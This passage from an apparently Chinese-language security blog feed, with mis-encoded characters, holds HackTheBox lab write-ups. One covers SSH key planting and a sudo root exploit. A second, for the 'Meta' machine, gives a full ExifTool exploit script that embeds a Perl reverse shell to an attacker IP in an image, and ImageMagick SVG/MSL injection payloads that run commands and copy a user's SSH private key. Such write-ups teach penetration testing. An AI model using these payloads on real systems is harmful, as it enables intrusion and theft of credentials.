<p>æˆ‘ä»¬å°è¯•æ”¾ä¸€ä¸ªåŒ…çœ‹çœ‹ï¼Œè¿”å›çš„ä¿¡æ¯æ­£å¸¸<br><img src="https://img-blog.csdnimg.cn/fb97d042c99a4c2cbd5d137662724125.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™ç§è·¯ç”±å™¨å¼çš„ï¼Œç›´è§‰å‘Šè¯‰æˆ‘å¯èƒ½å­˜åœ¨RCEæ¼æ´ï¼Œæˆ‘ä»¬å°è¯•æ„é€ payloadçœ‹çœ‹è¿”å›çš„ç»“æœã€‚å‘ç°ç›´æ¥è¿”å›ç”¨æˆ·åç§°ï¼Œé‚£è¯æ˜RCEæ¼æ´æ˜¯å­˜åœ¨çš„ã€‚<br><img src="https://img-blog.csdnimg.cn/70f7be924704490baff42b1df46f08ec.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>æ—¢ç„¶æˆ‘ä»¬å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°è¯•æ„é€ POCè¿›è¡Œæ¼æ´åˆ©ç”¨ã€‚é¦–å…ˆæˆ‘ä»¬å…ˆå°è¯•æ˜¯å¦å¯ä»¥å†™å…¥æ–‡ä»¶ï¼Œå‘ç°å¹¶æ²¡æœ‰æ•°æ®åŒ…è¿”å›ï¼Œé‚£è¯æ˜è¿™ä¸ªä¸è¡Œ<br><img src="https://img-blog.csdnimg.cn/529e423d54c14aca97c5a2da26972a9c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£æˆ‘ä»¬å†è¯•è¯•èƒ½ä¸èƒ½æ‰§è¡Œ<code>/bin/bash</code>çš„å‘½ä»¤ï¼Œå‘ç°å¥½åƒä¹Ÿä¸è¡Œ<br><img src="https://img-blog.csdnimg.cn/40a5269c9148407dbd145fb7f943cdda.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£æˆ‘ä»¬è¯•è¯•<code>ls</code>å‘½ä»¤ï¼Œå‘ç°å¯ä»¥æˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼Œå¹¶ä¸”è¿”å›å†…å®¹<br><img src="https://img-blog.csdnimg.cn/45313dfdafa64ca5938a5aaf5ebe37f1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å°è¯•<code>.ssh</code>ç›®å½•æ˜¯å¦å¯ä»¥å†™å…¥æ–‡ä»¶ï¼Œç­”æ¡ˆæ˜¯å¯ä»¥çš„<br><img src="https://img-blog.csdnimg.cn/2262039e5fa24afe9d495f629d560c91.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£æˆ‘ä»¬å°±æœ‰ä¸€ä¸ªæ€è·¯äº†ï¼Œå°±æ˜¯æˆ‘ä»¬å¯ä»¥è‡ªå·±ç”Ÿæˆä¸€ä¸ªsshçš„keyï¼Œç„¶åå†™å…¥åˆ°è¿™ä¸ªç›®å½•ä¸Šï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç™»å½•åˆ°è¿™å°ä¸»æœºä¸Šäº†ã€‚é¦–å…ˆæˆ‘ä»¬åœ¨kaliä¸Šç”Ÿæˆä¸€ä¸ªid_rsa.pubæ–‡ä»¶ï¼Œç„¶åå‘é€åˆ°.sshç›®å½•ä¸Šï¼Œå¹¶èµ‹äºˆ700æƒé™</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDA4G+qgL/420+qY3ylhOQOGU9/0AqjC1aodWwl+Gb3KoQGzkqMTsZ6ju64LkT2nguCeMB1NIQrUPoifSlPC/HjKD277s076eGSfuBkjTWy2EL3V6I71kXkblmeyHNFo7Vbpmbkk+NTC3Yn2gwi8uGAX10GsEzliu+dG8ldKXMNzrz9Vk2KUKJPIEuMVHlG6lMCY5s6zO1CXG5MZLoFO2S2j5MOUAhV6h1ziC6zGBwXbs1m+hJvVzPfRUFTxmbsGtQAqueWMsBBHOhss4FgNNJe4pgeNQfdkwNlrq65V7g/gyQODG/mhsd81HimqyZY90vSipxysEV/aNd39RaBSSm3o4mOuoIRsZnU1DlBOdPMLOQaw6ERc2mwQFAyZTMa6vVDi/seoltYHUDaojfuTdIkqSN65a2IZAOhm9QpXXBqBHkWRrx/B3htrQA/Pxfy4Gnvpy3wqli/BvlrzI/a9m3FaZNGilSo36lB2hOeS+dzUcilkXJqkCvOJa5r94M4+RM= root@kali</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/ff6804d51e9d4c69ad60f5bbba670bf6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/35e772f089064ac29dc72e9e7d9dac5e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¯ä»¥åœ¨kaliä¸Šç™»å½•æˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/7197de9bfd0642eea38a56b856055a36.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ææƒåˆ°ROOT"><a href="#ææƒåˆ°ROOT" class="headerlink" title="ææƒåˆ°ROOT"></a>ææƒåˆ°ROOT</h2><p>é¦–å…ˆæˆ‘ä»¬å…ˆä¸Šä¼ ä¸ªlinpeas.shæ–‡ä»¶ï¼Œçœ‹çœ‹æœ‰ä»€ä¹ˆææƒçš„ç‚¹ã€‚æˆ‘ä»¬ä»è¿™é‡Œçœ‹åˆ°äº†sudoçš„ç‰ˆæœ¬æ˜¯æ—§ç‰ˆçš„ï¼Œè€Œä¸”æç¤ºè¯´å¯èƒ½å­˜åœ¨æ¼æ´<br><img src="https://img-blog.csdnimg.cn/a36a9401dcbc4010bb23df3661956258.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/f5c95d3627f04de3aef68e72d5a6bb85.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/21b844b3a03248268e09ed0b2359072d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬åœ¨githubä¸Šæ‰¾åˆ°äº†å¯¹åº”çš„ææƒæ¼æ´ï¼Œç¼–å·ä¸º<code>CVE-2021-3156</code>ã€‚å› ä¸ºä¸èƒ½wgetï¼Œæ‰€ä»¥æˆ‘æŠŠé‡Œé¢çš„å†…å®¹éƒ½ä¸€ä¸€å¤åˆ¶äº†å‡ºæ¥ï¼Œè¿™æ˜¯githubçš„åœ°å€<a href="https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit">https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit</a><br><img src="https://img-blog.csdnimg.cn/b59453abc5bc417aa4ac9b04aaa6f3b4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
]]></content>
      <categories>
        <category>Appæ¸—é€</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>Meta</title>
    <url>/2022/02/28/Meta/</url>
    <content><![CDATA[<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>å‘ç°ç›®æ ‡ä¸»æœºåªå¼€æ”¾äº†sshå’ŒwebæœåŠ¡<br><img src="https://img-blog.csdnimg.cn/e44de3ff9ec249158e313f30d95c73ee.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å½“æˆ‘ä»¬è®¿é—®webä¸»é¡µæ—¶ï¼Œå‘ç°åªæ˜¯ä¸€ä¸ªå¾ˆæ™®é€šçš„apacheæ­å»ºçš„é¡µé¢<br><img src="https://img-blog.csdnimg.cn/5faebd3ecae84cfcb3b00eacdf9fdfc5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<span id="more"></span>

<p>ç›®å½•æ‰«æè²Œä¼¼å¥½åƒä¹Ÿæ²¡å‘ç°ä»€ä¹ˆæœ‰ä»·å€¼çš„ä¿¡æ¯<br><img src="https://img-blog.csdnimg.cn/1e7e687ac113488b8fb14fa19ed5a61d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<!--more-->

<p>ä»€ä¹ˆå‘ç°ä¹Ÿæ²¡æœ‰ï¼Œå½“æˆ‘ä»¬æ‰«æå­åŸŸåæ—¶ï¼Œå‘ç°äº†ä¸€ä¸ªå­åŸŸ<br><img src="https://img-blog.csdnimg.cn/1314b6048efc42bca44cf2435e76decf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å½“æˆ‘ä»¬è®¿é—®è¿™ä¸ªå­åŸŸæ—¶ï¼Œå‘ç°æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„ç‚¹ã€‚ç»è¿‡åå¤æµ‹è¯•ï¼Œåˆæ­¥æ–­å®šå®ƒå¯¹ä¸Šä¼ å†…å®¹è¿›è¡Œäº†ä»”ç»†çš„æ£€æŸ¥ï¼Œä»»ä½•ä¸ç¬¦åˆå›¾ç‰‡ç‰¹å¾çš„æ–‡ä»¶éƒ½ä¼šè¢«è¿‡æ»¤æ‰<br><img src="https://img-blog.csdnimg.cn/22c1b5eabb3e4ce09a79adbcb78671b9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£æˆ‘ä»¬å°è¯•ä¸Šä¼ ä¸€å¼ æ­£å¸¸çš„å›¾ç‰‡è¯•è¯•ï¼Œè¿™ä¸ªæ ¼å¼æ˜¯å¦å¾ˆçœ¼ç†Ÿï¼Ÿå¯¹çš„ï¼Œè¿™æ˜¯exiftoolå·¥å…·çš„è¾“å‡ºæ ¼å¼<br><img src="https://img-blog.csdnimg.cn/2eeabd15c6a041ff8ac20e97e9fac527.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/63c038ce761e41d3b3cc235f3354e1b6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>è¯´å®è¯è¿™é‡Œæ˜¯æˆ‘è‡ªå·±æœ¬äººæ²¡æƒ³åˆ°ï¼Œå¯èƒ½æ˜¯æˆ‘è‡ªå·±çš„ç»éªŒä¸å¤ªå¤Ÿå§ã€‚è¿™é‡Œæˆ‘ä»¬è¦æ‰¾çš„æ˜¯exiftoolå¯¹åº”çš„æ¼æ´ï¼Œå¯¹çš„æ²¡æƒ³åˆ°å§ï¼Œæˆ‘ä¹Ÿæ˜¯å‚è€ƒäº†åˆ«äººçš„æ„è§æ‰çŸ¥é“çš„ã€‚è¿™é‡Œå·²ç»æŠ«éœ²å‡ºäº†å¯¹åº”çš„æ¼æ´ç¼–å·äº†<br><img src="https://img-blog.csdnimg.cn/79945371d22b48d38a108e4b60f39dbb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘é€‰æ‹©äº†ç¬¬äºŒä¸ªç½‘å€ä¸Šçš„æ¼æ´åˆ©ç”¨è„šæœ¬ï¼Œå› ä¸ºä¸Šé¢é‚£ä¸ªä¾èµ–é—®é¢˜å¤ªå¤æ‚äº†ã€‚é¦–å…ˆæˆ‘ä»¬å…ˆç”Ÿæˆä¸€ä¸ªå›¾ç‰‡é©¬æ–‡ä»¶ï¼Œå°†è„šæœ¬æ–‡ä»¶çš„IPå’Œç›‘å¬ç«¯å£æ”¹æˆæˆ‘ä»¬å¯¹åº”çš„IPå’Œç«¯å£</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;10.10.14.60&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;4444&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;(metadata \&quot;\c$&#123;use MIME::Base64;eval(decode_base64(&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = payload + base64.b64encode( <span class="string">f&quot;use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#x27;tcp&#x27;));if(connect(S,sockaddr_in(<span class="subst">&#123;port&#125;</span>,inet_aton(&#x27;<span class="subst">&#123;ip&#125;</span>&#x27;))))&#123;&#123;open(STDIN,&#x27;&gt;&amp;S&#x27;);open(STDOUT,&#x27;&gt;&amp;S&#x27;);open(STDERR,&#x27;&gt;&amp;S&#x27;);exec(&#x27;/bin/sh -i&#x27;);&#125;&#125;;&quot;</span>.encode() )</span><br><span class="line"></span><br><span class="line">payload = payload + <span class="string">b&quot;&#x27;))&#125;;\&quot;)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload_file = <span class="built_in">open</span>(<span class="string">&#x27;payload&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">payload_file.write(payload.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">payload_file.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">subprocess.run([<span class="string">&#x27;bzz&#x27;</span>, <span class="string">&#x27;payload&#x27;</span>, <span class="string">&#x27;payload.bzz&#x27;</span>])</span><br><span class="line">subprocess.run([<span class="string">&#x27;djvumake&#x27;</span>, <span class="string">&#x27;exploit.djvu&#x27;</span>, <span class="string">&quot;INFO=1,1&quot;</span>, <span class="string">&#x27;BGjp=/dev/null&#x27;</span>, <span class="string">&#x27;ANTz=payload.bzz&#x27;</span>])</span><br><span class="line">subprocess.run([<span class="string">&#x27;exiftool&#x27;</span>, <span class="string">&#x27;-config&#x27;</span>, <span class="string">&#x27;configfile&#x27;</span>, <span class="string">&#x27;-HasselbladExif&lt;=exploit.djvu&#x27;</span>, <span class="string">&#x27;image.jpg&#x27;</span>]) </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/fac6e927ad1940cc90f1a379e3b299c5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸Šä¼ image.jpgæœ¨é©¬å›¾ç‰‡åï¼Œæˆ‘ä»¬å¾—åˆ°äº†www-dataç”¨æˆ·çš„æƒé™<br><img src="https://img-blog.csdnimg.cn/9380c7ea757846259f3151ada423caf7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä½†æ˜¯å½“æˆ‘ä»¬è¿›å…¥thomasç”¨æˆ·çš„<code>.ssh</code>ç›®å½•æ—¶ï¼Œå‘ç°æ²¡æœ‰æƒé™ï¼Œå¹¶ä¸”user.txtæ–‡ä»¶ä¹Ÿæ²¡æœ‰æƒé™æŸ¥çœ‹<br><img src="https://img-blog.csdnimg.cn/7888820403bb4a8382561e6bd9c30d71.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŸ¥çœ‹ä¸»æœºçš„å†…æ ¸ç‰ˆæœ¬ï¼Œå‘ç°æ˜¯64ä½çš„Linuxä¸»æœº<br><img src="https://img-blog.csdnimg.cn/cb52633575a546c2817023ca0d7b04b1.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å¯ä»¥å°è¯•ä¸Šä¼ pspy64è¿™ä¸ªè„šæœ¬è¿›è¡Œæ¢æµ‹ï¼Œpspy æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œæ—¨åœ¨ä¾¦å¬è¿›ç¨‹è€Œæ— éœ€ root æƒé™ã€‚å®ƒå…è®¸æ‚¨åœ¨æ‰§è¡Œæ—¶æŸ¥çœ‹å…¶ä»–ç”¨æˆ·ã€cron ä½œä¸šç­‰è¿è¡Œçš„å‘½ä»¤ã€‚å‘ç°äº†ä¸€ä¸ª<code>convert_images.sh</code>è„šæœ¬<br><img src="https://img-blog.csdnimg.cn/062aec9a84b14b5190b0501765926e0e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªè„šæœ¬çš„å†…å®¹ï¼Œå‘ç°å®ƒæ˜¯å…ˆè¿›å…¥åˆ°å¯¹åº”çš„ç›®å½•ä¸­ï¼Œç„¶åå†è¿è¡Œmogrifyè¿™ä¸ªç¨‹åºå°†å‘ç°çš„æ–‡ä»¶è½¬æ¢ä¸ºpngæ–‡ä»¶ï¼Œæœ€åæ€æ­»è¿™ä¸ªè¿›ç¨‹ã€‚<br><img src="https://img-blog.csdnimg.cn/ac6aaed6b8334939a293bfd860e98975.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹ä¸€ä¸‹mogrifyè¿™ä¸ªç¨‹åºçš„ç‰ˆæœ¬ï¼Œå‘ç°æ˜¯<code>7.0.10-36</code><br><img src="https://img-blog.csdnimg.cn/073f7d8415794159b62d0729a8c746f0.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨ç½‘ä¸Šæœç´¢åˆ°å¯¹åº”çš„æ¼æ´ç¼–å·æ˜¯<code>CVE-2016-3714</code><br><img src="https://img-blog.csdnimg.cn/3b8c9945b1b34bdcb9bf0ab65d8dc735.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åˆ©ç”¨çš„æ–¹æ³•æ˜¯ä¸Šä¼ ä¸€ä¸ªpoc.svgæ–‡ä»¶åˆ°<code>/dev/shm</code>ç›®å½•ä¸‹ï¼Œå¹¶å°†poc.svgæ–‡ä»¶å¤åˆ¶åˆ°<code>/var/www/dev01.artcorp.htb/convert_images/</code>è¿™ä¸ªç›®å½•ä¸‹ï¼Œç»è¿‡ä¸€æ®µæ—¶é—´åä¼šç”Ÿæˆä¸€ä¸ª0wnedæ–‡ä»¶ï¼Œè¾“å‡ºäº†ç”¨æˆ·åè¯æ˜æ–‡ä»¶æˆåŠŸæ‰§è¡Œäº†åŒ…å«çš„å‘½ä»¤</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">authenticate</span>=<span class="string">&#x27;ff&quot; `echo $(id)&gt; /dev/shm/0wned`;&quot;&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">read</span> <span class="attr">filename</span>=<span class="string">&quot;pdf:/etc/passwd&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">get</span> <span class="attr">width</span>=<span class="string">&quot;base-width&quot;</span> <span class="attr">height</span>=<span class="string">&quot;base-height&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">resize</span> <span class="attr">geometry</span>=<span class="string">&quot;400x400&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">write</span> <span class="attr">filename</span>=<span class="string">&quot;test.png&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;700&quot;</span> <span class="attr">height</span>=<span class="string">&quot;700&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span>&gt;</span>       </span><br><span class="line">  <span class="tag">&lt;<span class="name">image</span> <span class="attr">xlink:href</span>=<span class="string">&quot;msl:poc.svg&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/4c3e86599bf44cfc96a8a44f7ec80ac1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£æˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹poc.svgé‡Œé¢çš„å†…å®¹ï¼Œå°è¯•å°†<code>thomas</code>è´¦æˆ·çš„å¯†é’¥æ–‡ä»¶è¯»å–å‡ºæ¥</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">authenticate</span>=<span class="string">&#x27;ff&quot; `echo $(cat ~/.ssh/id_rsa)&gt; /dev/shm/id_rsa`;&quot;&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">read</span> <span class="attr">filename</span>=<span class="string">&quot;pdf:/etc/passwd&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">get</span> <span class="attr">width</span>=<span class="string">&quot;base-width&quot;</span> <span class="attr">height</span>=<span class="string">&quot;base-height&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">resize</span> <span class="attr">geometry</span>=<span class="string">&quot;400x400&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">write</span> <span class="attr">filename</span>=<span class="string">&quot;test.png&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;700&quot;</span> <span class="attr">height</span>=<span class="string">&quot;700&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span>&gt;</span>       </span><br><span class="line">  <span class="tag">&lt;<span class="name">image</span> <span class="attr">xlink:href</span>=<span class="string">&quot;msl:poc.svg&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>æˆåŠŸè¯»å–å¯†é’¥ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥å¼€å¯ä¸€ä¸ªhttpæœåŠ¡å°†id_rsaæ–‡ä»¶ä¸‹è½½ä¸‹æ¥<br><img src="https://img-blog.csdnimg.cn/1e6d846d9e1f4541bfd05772e96373d6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‡æ–°ç¼–æ’ä¸€ä¸‹é¡ºåºåï¼Œå¯ä»¥æˆåŠŸè¿æ¥åˆ°thomasç”¨æˆ·<br><img src="https://img-blog.csdnimg.cn/d92c5bb5b20846719f1eb0a4e5c57592.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
